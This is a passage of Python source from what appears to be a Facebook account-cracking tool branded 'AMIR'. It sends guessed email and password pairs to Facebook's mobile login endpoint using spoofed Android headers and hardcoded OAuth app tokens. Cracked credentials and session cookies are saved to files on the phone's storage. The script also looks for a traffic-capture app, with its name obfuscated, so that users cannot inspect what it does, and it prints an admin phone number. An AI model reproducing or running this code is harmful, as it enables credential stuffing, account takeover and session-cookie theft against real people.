            bun = f"[FBAN/FB4A;FBAV/{cgs};FBBV/197851403;FBDM/"+"{density=2.0,width=720,height=1384}"+";FBLC/en_GB;FBRV/0;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6 Pro;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
            token = random.choice(['OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662'])
            head = {
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Priority': 'u=3, i',
                'X-Fb-Sim-Hni': '45204',
                'X-Fb-Net-Hni': '45201',
                'X-Fb-Connection-Quality': 'GOOD',
                'Zero-Rated': '0',
                'User-Agent': bun,
                'Authorization': 'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
                'X-Fb-Connection-Bandwidth': '24807555',
                'X-Fb-Connection-Type': 'MOBILE.LTE',
                'X-Fb-Device-Group': '5120',
                'X-Tigon-Is-Retry': 'False',
                'X-Fb-Friendly-Name': 'authenticate',
                'X-Fb-Request-Analytics-Tags': 'unknown',
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': 'True',
                'X-Fb-Server-Cluster': 'True',
                'Content-Length': '847'
            }
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'family_device_id': str(uuid.uuid4()),
                'secure_family_device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'try_num': '1',
                'email': ids,
                'password': pas,
                'method': 'auth.login',
                'generate_session_cookies': '1',
                'sim_serials': "['80973453345210784798']",
                'openid_flow': 'android_login',
                'openid_provider': 'google',
                'openid_emails': "['01710940017']",
                'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                'error_detail_type': 'button_with_disabled',
                'source': 'account_recovery',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'
            }
            po = requests.post('https://' + 'b-gr' + 'ap' + 'h' + '.facebook.com/auth/login', data=data,
                              headers=head, allow_redirects=False).json()
            if 'session_key' in po:
                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookie = f"sb={ssbb};{coki}"
                print('\r\033[1;92m [AMIR-OK] ' + ids + ' | ' + pas + '\033[1;97m')
                oks.append(ids)
                open('/sdcard/AMIR/amir_ok.txt', 'a').write(ids + '|' + pas + '\n')
                open('/sdcard/AMIR/amir-cookies.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                break
            elif 'www.facebook.com' in po['error']['message']:
                if 'y' in pcu:
                    print('\r\033[1;31m [AMIR-CP] ' + ids + ' | ' + pas + '\033[1;97m')
                    cps.append(ids)
                    open('/sdcard/AMIR/amir-cp.txt', 'a').write(ids + '|' + pas + '\n')
                    break
                else:
                    cps.append(ids)
                    open('/sdcard/AMIR-CP.txt', 'a').write(ids + '|' + pas + '\n')
                    break
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    loop += 1

# ----[http-capture]----
try:
    a = "anar"
    t = "tt"
    fileee = os.listdir('/sdcard/Android/data/')
    if f'com.h{t}pc{a}y.pro' in fileee:
        print('\n\033[1;91mDonot try to bypass!\033[1;97m')
        #exit()
        exit(f'\nSomething went wrong\n\033[1;93mContact Admin : +923404708884\033[1;97m')
except Exception as e:
    print(e)
    pass
except PermissionError:
    pass





try:
    za()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:
        print(e)